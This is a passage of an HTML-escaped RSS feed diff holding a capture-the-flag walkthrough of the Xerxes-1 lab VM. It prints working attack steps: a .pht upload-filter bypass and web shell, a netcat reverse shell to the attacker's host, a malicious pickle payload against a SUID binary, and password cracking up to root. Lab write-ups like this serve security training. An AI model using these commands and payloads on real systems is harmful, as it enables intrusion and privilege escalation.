+&lt;p&gt;Gave me another base64 string.  I removed the white spaces, and decoded that into the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;++++++[&amp;gt;++++++++&amp;lt;-]&amp;gt;++++.+.----.-..&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I was really disappointed to see this, as I thought I was well off base.  This doesn&amp;rsquo;t look like anything I&amp;rsquo;ve seen before, although I figured it would be a massive coincidence that the steps taken thus far gave me valid base64 string.  So I thought this must be significant somehow.&lt;/p&gt;
+
+&lt;p&gt;Googling that string didn&amp;rsquo;t come up with anything.  I went and found an online compiler of multiple programming languages - I admit that I&amp;rsquo;ve never seen this type of code before, but doesn&amp;rsquo;t mean it doesn&amp;rsquo;t exist.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-1/compileonline.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Clicking through each of these languages takes you to a page, containing a small script sample.  That made it a really quick exercise to get a very quick overview of each language.  I kept going until I found one with the syntax matching my string.&lt;/p&gt;
+
+&lt;p&gt;The brainf**k language matched perfectly and when I pasted my snippet into the window, it produced a value of &lt;code&gt;45100&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I went back to the upload page and uploaded my test file again with &lt;code&gt;45100&lt;/code&gt; as the password, and received:  &lt;em&gt;&amp;ldquo;test was uploaded. Have a nice day.&amp;rdquo;&lt;/em&gt;  Following the link showed that the files are uploaded to the &lt;code&gt;/dev/upload/&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;h2 id=&#34;web-shell:e030175fb591c9e48fb1260bc12c80d4&#34;&gt;Web Shell&lt;/h2&gt;
+
+&lt;p&gt;Even though I expected it to fail as before, I tried to upload my PHP CMD file - it failed with the same error message.  I did some searching to find valid MimeTypes for Apache on Debian, and found what I was looking for fairly quickly on debian.org.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;application/x-httpd-php                         phtml pht php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This means that any file with an one of those three extensions, will be handled by the web server as PHP.  PHTML was also blocked, but PHT was sucessfully uploaded:  &lt;em&gt;&amp;ldquo;cmd.pht was uploaded. Have a nice day.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/xerxes# curl http://192.168.127.131/dev/upload/cmd.pht?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used this command execution to obtain a netcat shell on the system.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cmd=/bin/nc.traditional 192.168.127.127 4444 -e &#39;/bin/sh&#39;
+python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using this level of access, I was able to access &lt;code&gt;/home/amanpour&lt;/code&gt;.  There were several interesting files in here:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;www-data@xerxes:/home/amanpour$ ls -la
+
+drwxr-xr-x 3 amanpour amanpour 4096 Dec 19 01:15 .
+drwxr-xr-x 5 root     root     4096 Dec 17 23:34 ..
+-rwxr--r-- 1 amanpour amanpour  270 Dec 19 01:28 .bash_history
+-rw-r--r-- 1 amanpour amanpour  220 Dec 17 23:31 .bash_logout
+-rw-r--r-- 1 amanpour amanpour 3433 Dec 19 01:27 .bashrc
+-rw-r--r-- 1 amanpour amanpour  675 Dec 17 23:31 .profile
+drwx------ 2 amanpour amanpour 4096 Dec 19 01:15 .ssh
+-rw-r--r-- 1 amanpour amanpour 1240 Dec 18 02:53 lostpassword.png
+-rw-r--r-- 1 amanpour amanpour 1220 Dec 18 02:57 newpassword
+-rw-r--r-- 1 amanpour amanpour 1071 Dec 17 07:05 qr
+-rw-r--r-- 1 amanpour amanpour 1235 Dec 18 02:51 steqr.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we view the &lt;code&gt;.bash_history&lt;/code&gt; file for this user, it seems they used the &lt;code&gt;steqr&lt;/code&gt; python script in conjunction with the &lt;code&gt;newpassword&lt;/code&gt; file, to generate a new password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;www-data@xerxes:/home/amanpour$ cat .bash_history
+cat .bash_history
+python steqr.py -f newpassword
+passwd
+exit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Repeating that command gives the following output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;www-data@xerxes:/home/amanpour$ python steqr.py -f newpassword
+b56d9d8b6077fb56127d1c8ff84ece11
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried using this password to SSH as amanpour and I was granted access :) At last a proper shell!&lt;/p&gt;
+
+&lt;p&gt;A proper review of the &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/group&lt;/code&gt; files showed that users amampour and curtiz were members of a notes group, and delacroix was a member of the sudo group.  This gave a good indication of the path I should be taking to obtain root.  Another interesting thing which I almost missed, was shell entries for each user.  amanpour and curtiz have &lt;code&gt;/bin/bash&lt;/code&gt;, whereas delacroix has &lt;code&gt;/bin/delacroix&lt;/code&gt;.  No doubt this will come into play later :).&lt;/p&gt;
+
+&lt;h2 id=&#34;suid:e030175fb591c9e48fb1260bc12c80d4&#34;&gt;SUID&lt;/h2&gt;
+
+&lt;p&gt;I had a look for SUID binaries and found one in &lt;code&gt;/opt/notes/&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;find / -perm -4000 -type f 2&amp;gt;/dev/null
+/opt/notes
+
+amanpour@xerxes:~$ cd /opt/
+amanpour@xerxes:/opt$ ls -l
+
+-rwsr-s--x 1 curtiz notes 5111 Dec 18 05:59 notes
+-rwxr-x--- 1 curtiz notes 1343 Dec 19 00:47 notes.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;notes.py&lt;/code&gt; file is readable, so we can learn a few things.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The pickle module is imported&lt;/li&gt;
+&lt;li&gt;The default filename is &lt;code&gt;notes&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Files are saved in &lt;code&gt;/home/curtiz&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You can load the application and view the notes already entered.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;amanpour@xerxes:/opt$ ./notes
+-------------------------------
+ Welcome to Juan&#39;s to-do list! 
+   type help for more info     
+-------------------------------
+help 
+ Available commands:
+   - add  [note] : add a note for Juan
+   - show        : show to-do list
+   - save [file] : save to-do list
+   - load [file] : load to-do list
+   - quit        : exit
+load notes
+show
+ - I&#39;ve found Marie&#39;s keyfile and was able to login via ssh,
+ - but it seems she has added another layer of protection...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Probably a clue for obtaining the delacroix user - take note.&lt;/p&gt;
+
+&lt;p&gt;I went and did some reading around the python pickle module, and the actual python documentation contained an interesting warning message:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I carried on reading and came across a document called Sour Pickles, from an old Black Hat presentation which outlined the following PoC:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cos
+system
+(S&#39;sleep 10&#39;
+tR.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I modified this so it would open a new shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cos
+system
+(S&#39;/bin/sh&#39;
+tR.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I put this code into &lt;code&gt;/tmp/pickleme&lt;/code&gt; and executed &lt;code&gt;notes&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;amanpour@xerxes:/opt$ ./notes
+load ../../tmp/pickleme
+$ id
+uid=1001(amanpour) gid=1001(amanpour) euid=1002(curtiz) egid=1003(notes) groups=1002(curtiz),1001(amanpour),1003(notes)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;curtiz-delacroix:e030175fb591c9e48fb1260bc12c80d4&#34;&gt;Curtiz &amp;amp; Delacroix&lt;/h2&gt;
+
+&lt;p&gt;I now have access to &lt;code&gt;/home/curtiz&lt;/code&gt;.  The only interesting file in there is &lt;code&gt;id_rsa&lt;/code&gt;.  Reading the &lt;code&gt;.bash_history&lt;/code&gt; file, it seems to indicate that this key is for the delacroix user, but curtiz was unable to log in properly and wrote the note we saw earlier.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/xerxes# ssh -i id_rsa delacroix@192.168.127.131
+Linux xerxes 3.2.0-4-486 #1 Debian 3.2.51-1 i686
+You have mail.
+Last login: Thu May  8 05:46:02 2014 from 192.168.127.127
+Password:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It seems the SSH portion of the login was successful, as it tells us there&amp;rsquo;s mail waiting, but we also got prompted for another password.  This must be realted to the &lt;code&gt;/bin/delacroix&lt;/code&gt; shell that we noticed in the &lt;code&gt;/etc/passwd&lt;/code&gt; file earlier.  It&amp;rsquo;s a binary executable, but has readable portions when viewed with &lt;code&gt;strings&lt;/code&gt;.  Luckily, the password the program prompts for is shown.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ strings /bin/delacroix
+3d054afb77714ca938d8bca104fcb141
+/bin/bash
+Password:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So it seems the purpose of this program is to prompt for a password and launch &lt;code&gt;/bin/bash&lt;/code&gt; when the correct one is entered.  I SSH&amp;rsquo;d in again and tried this password, but it didn&amp;rsquo;t work.  The next assumption was that this was an encrypted or encoded hash of a password.  I used hash-identifier which told me it was an MD5 hash.  Before I launched &lt;code&gt;john&lt;/code&gt;, I tried my luck with an MD5 online cracker, which worked nicely.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;3d054afb77714ca938d8bca104fcb141 MD5 : VonBraun&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I was finally able to SSH in as delacroix.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/xerxes# ssh -i id_rsa delacroix@192.168.127.131
+Linux xerxes 3.2.0-4-486 #1 Debian 3.2.51-1 i686
+You have mail.
+Last login: Fri May 16 13:57:11 2014 from 192.168.127.127
+Password: VonBraun
+XERXES checking security...
+delacroix@xerxes:/home/delacroix$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;root:e030175fb591c9e48fb1260bc12c80d4&#34;&gt;root&lt;/h2&gt;
+
+&lt;p&gt;I knew delacroix was a member of the sudo group, so tried to view her rights with &lt;code&gt;sudo -l&lt;/code&gt;.  However, VonBraun was not her user password; *sigh*&amp;hellip; Damn you Bas.&lt;/p&gt;
+
+&lt;p&gt;There were two interesting files in her user directory: &lt;code&gt;check.sh&lt;/code&gt; and &lt;code&gt;generate.sh&lt;/code&gt;.  Viewing the &lt;code&gt;.bash_history&lt;/code&gt; file suggested that her user password was generated by &lt;code&gt;generate.sh&lt;/code&gt;.  Viewing this file showed that it was quite a simple script.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
+touch .last &amp;amp;&amp;amp; p=$(date | awk &#39;{print $4}&#39; | md5sum | awk &#39;{print $1}&#39;)
+echo &amp;quot;XERXES has generated a new password: $p&amp;quot;
+echo &amp;quot;  XERXES is forever&amp;quot;
+echo &amp;quot;   at your service&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So a file is created called &lt;code&gt;.last&lt;/code&gt; and the password generated is another MD5 of some portion of the date.  It doesn&amp;rsquo;t seem &lt;code&gt;.last&lt;/code&gt; is removed afterwards, so we can go back and redo these steps to obtain the same output.  I&amp;rsquo;ve put the commands below in stages to make it easier to follow (there&amp;rsquo;s probably a quicker way to do it, this is just how I worked through it).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes:/home/delacroix$ stat .last                  
+  File: `.last&#39;
+  Size: 0           Blocks: 0          IO Block: 4096   regular empty file
+Device: 801h/2049d  Inode: 45529       Links: 1
+Access: (0644/-rw-r--r--)  Uid: ( 1000/delacroix)   Gid: ( 1000/delacroix)
+Access: 2014-05-08 05:48:48.586907479 -0700
+Modify: 2013-12-19 00:19:51.024911360 -0800
+Change: 2013-12-19 00:19:51.024911360 -0800
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can take either the Modify or Change date (as they&amp;rsquo;re the same).  It&amp;rsquo;s important not to date the Access date, which will obviously not give us the result we want.  Doing &lt;code&gt;date | awk &#39;{print $4}&#39;&lt;/code&gt; confirms the field we&amp;rsquo;re after is the time, in this case it&amp;rsquo;s &lt;code&gt;00:19:51&lt;/code&gt;, but we&amp;rsquo;ll stick with using awk to ensure there are no mistakes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes:/home/delacroix$ stat .last | grep Modify
+Modify: 2013-12-19 00:19:51.024911360 -0800
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes:/home/delacroix$ stat .last | grep Modify | awk &#39;{print $3}&#39;
+00:19:51.024911360
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes:/home/delacroix$ stat .last | grep Modify | awk &#39;{print $3}&#39; | cut -d&amp;quot;.&amp;quot; -f1
+00:19:51
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes:/home/delacroix$ stat .last | grep Modify | awk &#39;{print $3}&#39; | cut -d&amp;quot;.&amp;quot; -f1 | md5sum
+6cf49e97c915079e27c09d41da9d95e4  -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So this gives us (what is hopefully) delacroix&amp;rsquo;s current password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes:/home/delacroix$ sudo -l
+[sudo] password for delacroix: 6cf49e97c915079e27c09d41da9d95e4
+User delacroix may run the following commands on this host:
+    (ALL : ALL) ALL
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Elevating to root was now a simple exercise: &lt;code&gt;sudo -i&lt;/code&gt;
+Now to read the flag&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@xerxes:~# less /root/flag 
+&amp;quot;/root/flag&amp;quot; may be a binary file.  See it anyway?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You&amp;rsquo;ve got to be joking, I thought&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@xerxes:~# file flag 
+flag: PNG image data, 250 x 269, 8-bit/color RGB, non-interlaced
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ah, that&amp;rsquo;s not too bad :) Downloaded this to my machine, and&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-1/flag.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
